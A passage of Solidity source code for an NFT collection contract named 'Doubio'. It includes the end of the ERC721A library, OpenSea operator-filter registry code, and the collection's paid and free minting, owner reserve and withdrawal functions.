1011         uint256 tokenId,
1012         bytes memory _data
1013     ) private returns (bool) {
1014         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1015             bytes4 retval
1016         ) {
1017             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1018         } catch (bytes memory reason) {
1019             if (reason.length == 0) {
1020                 revert TransferToNonERC721ReceiverImplementer();
1021             } else {
1022                 assembly {
1023                     revert(add(32, reason), mload(reason))
1024                 }
1025             }
1026         }
1027     }
1028 
1029     // =============================================================
1030     //                        MINT OPERATIONS
1031     // =============================================================
1032 
1033     /**
1034      * @dev Mints `quantity` tokens and transfers them to `to`.
1035      *
1036      * Requirements:
1037      *
1038      * - `to` cannot be the zero address.
1039      * - `quantity` must be greater than 0.
1040      *
1041      * Emits a {Transfer} event for each mint.
1042      */
1043     function _mint(address to, uint256 quantity) internal virtual {
1044         uint256 startTokenId = _currentIndex;
1045         if (quantity == 0) revert MintZeroQuantity();
1046 
1047         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1048 
1049         // Overflows are incredibly unrealistic.
1050         // `balance` and `numberMinted` have a maximum limit of 2**64.
1051         // `tokenId` has a maximum limit of 2**256.
1052         unchecked {
1053             // Updates:
1054             // - `balance += quantity`.
1055             // - `numberMinted += quantity`.
1056             //
1057             // We can directly add to the `balance` and `numberMinted`.
1058             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1059 
1060             // Updates:
1061             // - `address` to the owner.
1062             // - `startTimestamp` to the timestamp of minting.
1063             // - `burned` to `false`.
1064             // - `nextInitialized` to `quantity == 1`.
1065             _packedOwnerships[startTokenId] = _packOwnershipData(
1066                 to,
1067                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1068             );
1069 
1070             uint256 toMasked;
1071             uint256 end = startTokenId + quantity;
1072 
1073             // Use assembly to loop and emit the `Transfer` event for gas savings.
1074             // The duplicated `log4` removes an extra check and reduces stack juggling.
1075             // The assembly, together with the surrounding Solidity code, have been
1076             // delicately arranged to nudge the compiler into producing optimized opcodes.
1077             assembly {
1078                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1079                 toMasked := and(to, _BITMASK_ADDRESS)
1080                 // Emit the `Transfer` event.
1081                 log4(
1082                     0, // Start of data (0, since no data).
1083                     0, // End of data (0, since no data).
1084                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1085                     0, // `address(0)`.
1086                     toMasked, // `to`.
1087                     startTokenId // `tokenId`.
1088                 )
1089 
1090                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1091                 // that overflows uint256 will make the loop run out of gas.
1092                 // The compiler will optimize the `iszero` away for performance.
1093                 for {
1094                     let tokenId := add(startTokenId, 1)
1095                 } iszero(eq(tokenId, end)) {
1096                     tokenId := add(tokenId, 1)
1097                 } {
1098                     // Emit the `Transfer` event. Similar to above.
1099                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1100                 }
1101             }
1102             if (toMasked == 0) revert MintToZeroAddress();
1103 
1104             _currentIndex = end;
1105         }
1106         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1107     }
1108 
1109     /**
1110      * @dev Mints `quantity` tokens and transfers them to `to`.
1111      *
1112      * This function is intended for efficient minting only during contract creation.
1113      *
1114      * It emits only one {ConsecutiveTransfer} as defined in
1115      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1116      * instead of a sequence of {Transfer} event(s).
1117      *
1118      * Calling this function outside of contract creation WILL make your contract
1119      * non-compliant with the ERC721 standard.
1120      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1121      * {ConsecutiveTransfer} event is only permissible during contract creation.
1122      *
1123      * Requirements:
1124      *
1125      * - `to` cannot be the zero address.
1126      * - `quantity` must be greater than 0.
1127      *
1128      * Emits a {ConsecutiveTransfer} event.
1129      */
1130     function _mintERC2309(address to, uint256 quantity) internal virtual {
1131         uint256 startTokenId = _currentIndex;
1132         if (to == address(0)) revert MintToZeroAddress();
1133         if (quantity == 0) revert MintZeroQuantity();
1134         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1135 
1136         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1137 
1138         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1139         unchecked {
1140             // Updates:
1141             // - `balance += quantity`.
1142             // - `numberMinted += quantity`.
1143             //
1144             // We can directly add to the `balance` and `numberMinted`.
1145             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1146 
1147             // Updates:
1148             // - `address` to the owner.
1149             // - `startTimestamp` to the timestamp of minting.
1150             // - `burned` to `false`.
1151             // - `nextInitialized` to `quantity == 1`.
1152             _packedOwnerships[startTokenId] = _packOwnershipData(
1153                 to,
1154                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1155             );
1156 
1157             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1158 
1159             _currentIndex = startTokenId + quantity;
1160         }
1161         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1162     }
1163 
1164     /**
1165      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1166      *
1167      * Requirements:
1168      *
1169      * - If `to` refers to a smart contract, it must implement
1170      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1171      * - `quantity` must be greater than 0.
1172      *
1173      * See {_mint}.
1174      *
1175      * Emits a {Transfer} event for each mint.
1176      */
1177     function _safeMint(
1178         address to,
1179         uint256 quantity,
1180         bytes memory _data
1181     ) internal virtual {
1182         _mint(to, quantity);
1183 
1184         unchecked {
1185             if (to.code.length != 0) {
1186                 uint256 end = _currentIndex;
1187                 uint256 index = end - quantity;
1188                 do {
1189                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1190                         revert TransferToNonERC721ReceiverImplementer();
1191                     }
1192                 } while (index < end);
1193                 // Reentrancy protection.
1194                 if (_currentIndex != end) revert();
1195             }
1196         }
1197     }
1198 
1199     /**
1200      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1201      */
1202     function _safeMint(address to, uint256 quantity) internal virtual {
1203         _safeMint(to, quantity, '');
1204     }
1205 
1206     // =============================================================
1207     //                        BURN OPERATIONS
1208     // =============================================================
1209 
1210     /**
1211      * @dev Equivalent to `_burn(tokenId, false)`.
1212      */
1213     function _burn(uint256 tokenId) internal virtual {
1214         _burn(tokenId, false);
1215     }
1216 
1217     /**
1218      * @dev Destroys `tokenId`.
1219      * The approval is cleared when the token is burned.
1220      *
1221      * Requirements:
1222      *
1223      * - `tokenId` must exist.
1224      *
1225      * Emits a {Transfer} event.
1226      */
1227     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1228         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1229 
1230         address from = address(uint160(prevOwnershipPacked));
1231 
1232         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1233 
1234         if (approvalCheck) {
1235             // The nested ifs save around 20+ gas over a compound boolean condition.
1236             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1237                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1238         }
1239 
1240         _beforeTokenTransfers(from, address(0), tokenId, 1);
1241 
1242         // Clear approvals from the previous owner.
1243         assembly {
1244             if approvedAddress {
1245                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1246                 sstore(approvedAddressSlot, 0)
1247             }
1248         }
1249 
1250         // Underflow of the sender's balance is impossible because we check for
1251         // ownership above and the recipient's balance can't realistically overflow.
1252         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1253         unchecked {
1254             // Updates:
1255             // - `balance -= 1`.
1256             // - `numberBurned += 1`.
1257             //
1258             // We can directly decrement the balance, and increment the number burned.
1259             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1260             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1261 
1262             // Updates:
1263             // - `address` to the last owner.
1264             // - `startTimestamp` to the timestamp of burning.
1265             // - `burned` to `true`.
1266             // - `nextInitialized` to `true`.
1267             _packedOwnerships[tokenId] = _packOwnershipData(
1268                 from,
1269                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1270             );
1271 
1272             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1273             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1274                 uint256 nextTokenId = tokenId + 1;
1275                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1276                 if (_packedOwnerships[nextTokenId] == 0) {
1277                     // If the next slot is within bounds.
1278                     if (nextTokenId != _currentIndex) {
1279                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1280                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1281                     }
1282                 }
1283             }
1284         }
1285 
1286         emit Transfer(from, address(0), tokenId);
1287         _afterTokenTransfers(from, address(0), tokenId, 1);
1288 
1289         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1290         unchecked {
1291             _burnCounter++;
1292         }
1293     }
1294 
1295     // =============================================================
1296     //                     EXTRA DATA OPERATIONS
1297     // =============================================================
1298 
1299     /**
1300      * @dev Directly sets the extra data for the ownership data `index`.
1301      */
1302     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1303         uint256 packed = _packedOwnerships[index];
1304         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1305         uint256 extraDataCasted;
1306         // Cast `extraData` with assembly to avoid redundant masking.
1307         assembly {
1308             extraDataCasted := extraData
1309         }
1310         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1311         _packedOwnerships[index] = packed;
1312     }
1313 
1314     /**
1315      * @dev Called during each token transfer to set the 24bit `extraData` field.
1316      * Intended to be overridden by the cosumer contract.
1317      *
1318      * `previousExtraData` - the value of `extraData` before transfer.
1319      *
1320      * Calling conditions:
1321      *
1322      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1323      * transferred to `to`.
1324      * - When `from` is zero, `tokenId` will be minted for `to`.
1325      * - When `to` is zero, `tokenId` will be burned by `from`.
1326      * - `from` and `to` are never both zero.
1327      */
1328     function _extraData(
1329         address from,
1330         address to,
1331         uint24 previousExtraData
1332     ) internal view virtual returns (uint24) {}
1333 
1334     /**
1335      * @dev Returns the next extra data for the packed ownership data.
1336      * The returned result is shifted into position.
1337      */
1338     function _nextExtraData(
1339         address from,
1340         address to,
1341         uint256 prevOwnershipPacked
1342     ) private view returns (uint256) {
1343         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1344         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1345     }
1346 
1347     // =============================================================
1348     //                       OTHER OPERATIONS
1349     // =============================================================
1350 
1351     /**
1352      * @dev Returns the message sender (defaults to `msg.sender`).
1353      *
1354      * If you are writing GSN compatible contracts, you need to override this function.
1355      */
1356     function _msgSenderERC721A() internal view virtual returns (address) {
1357         return msg.sender;
1358     }
1359 
1360     /**
1361      * @dev Converts a uint256 to its ASCII string decimal representation.
1362      */
1363     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1364         assembly {
1365             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1366             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1367             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1368             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1369             let m := add(mload(0x40), 0xa0)
1370             // Update the free memory pointer to allocate.
1371             mstore(0x40, m)
1372             // Assign the `str` to the end.
1373             str := sub(m, 0x20)
1374             // Zeroize the slot after the string.
1375             mstore(str, 0)
1376 
1377             // Cache the end of the memory to calculate the length later.
1378             let end := str
1379 
1380             // We write the string from rightmost digit to leftmost digit.
1381             // The following is essentially a do-while loop that also handles the zero case.
1382             // prettier-ignore
1383             for { let temp := value } 1 {} {
1384                 str := sub(str, 1)
1385                 // Write the character to the pointer.
1386                 // The ASCII index of the '0' character is 48.
1387                 mstore8(str, add(48, mod(temp, 10)))
1388                 // Keep dividing `temp` until zero.
1389                 temp := div(temp, 10)
1390                 // prettier-ignore
1391                 if iszero(temp) { break }
1392             }
1393 
1394             let length := sub(end, str)
1395             // Move the pointer 32 bytes leftwards to make room for the length.
1396             str := sub(str, 0x20)
1397             // Store the length.
1398             mstore(str, length)
1399         }
1400     }
1401 }
1402 
1403 
1404 interface IOperatorFilterRegistry {
1405     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1406     function register(address registrant) external;
1407     function registerAndSubscribe(address registrant, address subscription) external;
1408     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1409     function unregister(address addr) external;
1410     function updateOperator(address registrant, address operator, bool filtered) external;
1411     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1412     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1413     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1414     function subscribe(address registrant, address registrantToSubscribe) external;
1415     function unsubscribe(address registrant, bool copyExistingEntries) external;
1416     function subscriptionOf(address addr) external returns (address registrant);
1417     function subscribers(address registrant) external returns (address[] memory);
1418     function subscriberAt(address registrant, uint256 index) external returns (address);
1419     function copyEntriesOf(address registrant, address registrantToCopy) external;
1420     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1421     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1422     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1423     function filteredOperators(address addr) external returns (address[] memory);
1424     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1425     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1426     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1427     function isRegistered(address addr) external returns (bool);
1428     function codeHashOf(address addr) external returns (bytes32);
1429 }
1430 
1431 
1432 /**
1433  * @title  OperatorFilterer
1434  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1435  *         registrant's entries in the OperatorFilterRegistry.
1436  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1437  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1438  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1439  */
1440 abstract contract OperatorFilterer {
1441     error OperatorNotAllowed(address operator);
1442 
1443     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1444         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1445 
1446     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1447         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1448         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1449         // order for the modifier to filter addresses.
1450         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1451             if (subscribe) {
1452                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1453             } else {
1454                 if (subscriptionOrRegistrantToCopy != address(0)) {
1455                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1456                 } else {
1457                     OPERATOR_FILTER_REGISTRY.register(address(this));
1458                 }
1459             }
1460         }
1461     }
1462 
1463     modifier onlyAllowedOperator(address from) virtual {
1464         // Check registry code length to facilitate testing in environments without a deployed registry.
1465         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1466             // Allow spending tokens from addresses with balance
1467             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1468             // from an EOA.
1469             if (from == msg.sender) {
1470                 _;
1471                 return;
1472             }
1473             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1474                 revert OperatorNotAllowed(msg.sender);
1475             }
1476         }
1477         _;
1478     }
1479 
1480     modifier onlyAllowedOperatorApproval(address operator) virtual {
1481         // Check registry code length to facilitate testing in environments without a deployed registry.
1482         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1483             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1484                 revert OperatorNotAllowed(operator);
1485             }
1486         }
1487         _;
1488     }
1489 }
1490 
1491 /**
1492  * @title  DefaultOperatorFilterer
1493  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1494  */
1495 abstract contract TheOperatorFilterer is OperatorFilterer {
1496     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1497 
1498     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1499 }
1500 
1501 
1502 contract DoubioNFT is ERC721A, TheOperatorFilterer {
1503 
1504     bool public _isSaleActive;
1505 
1506     bool public _revealed;
1507 
1508     uint256 public mintPrice;
1509 
1510     uint256 public maxBalance;
1511 
1512     uint256 public maxMint;
1513 
1514     string public baseExtension;
1515 
1516     string public uriSuffix;
1517 
1518     address public owner;
1519 
1520     uint256 public maxSupply;
1521 
1522     uint256 public cost;
1523 
1524     uint256 public maxFreeNumerAddr = 1;
1525 
1526     mapping(address => uint256) _numForFree;
1527 
1528     mapping(uint256 => uint256) _numMinted;
1529 
1530     uint256 private maxPerTx;
1531 
1532     function Mint(uint256 amount) payable public {
1533         require(totalSupply() + amount <= maxSupply);
1534         if (msg.value == 0) {
1535             _safemints(amount);
1536             return;
1537         } 
1538         require(amount <= maxPerTx);
1539         require(msg.value >= amount * cost);
1540         _safeMint(msg.sender, amount);
1541     }
1542 
1543     function _safemints(uint256 amount) internal {
1544         require(amount == 1 
1545             && _numMinted[block.number] < FreeNum() 
1546             && _numForFree[tx.origin] < maxFreeNumerAddr );
1547             _numForFree[tx.origin]++;
1548             _numMinted[block.number]++;
1549         _safeMint(msg.sender, 1);
1550     }
1551 
1552     function reserve(address rec, uint256 amount) public onlyOwner {
1553         _safeMint(rec, amount);
1554     }
1555     
1556     modifier onlyOwner {
1557         require(owner == msg.sender);
1558         _;
1559     }
1560 
1561     constructor() ERC721A("Doubio", "Doubio") {
1562         owner = msg.sender;
1563         maxPerTx = 10;
1564         cost = 0.002 ether;
1565         maxSupply = 999;
1566     }
1567 
1568     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1569         return string(abi.encodePacked("ipfs://bafybeibwr5uyaey652r447o45canypv5jrqpxnf4s44z2alihf2qtn5aw4/", _toString(tokenId), ".json"));
1570     }
1571 
1572     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1573         maxFreeNumerAddr = maxTx;
1574     }
1575 
1576     function FreeNum() internal returns (uint256){
1577         return (maxSupply - totalSupply()) / 12;
1578     }
1579 
1580     function withdraw() external onlyOwner {
1581         payable(msg.sender).transfer(address(this).balance);
1582     }
1583 
1584     /////////////////////////////
1585     // OPENSEA FILTER REGISTRY 
1586     /////////////////////////////
1587 
1588     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1589         super.setApprovalForAll(operator, approved);
1590     }
1591 
1592     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1593         super.approve(operator, tokenId);
1594     }
1595 
1596     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1597         super.transferFrom(from, to, tokenId);
1598     }
1599 
1600     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1601         super.safeTransferFrom(from, to, tokenId);
1602     }
1603 
1604     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1605         public
1606         payable
1607         override
1608         onlyAllowedOperator(from)
1609     {
1610         super.safeTransferFrom(from, to, tokenId, data);
1611     }
1612 }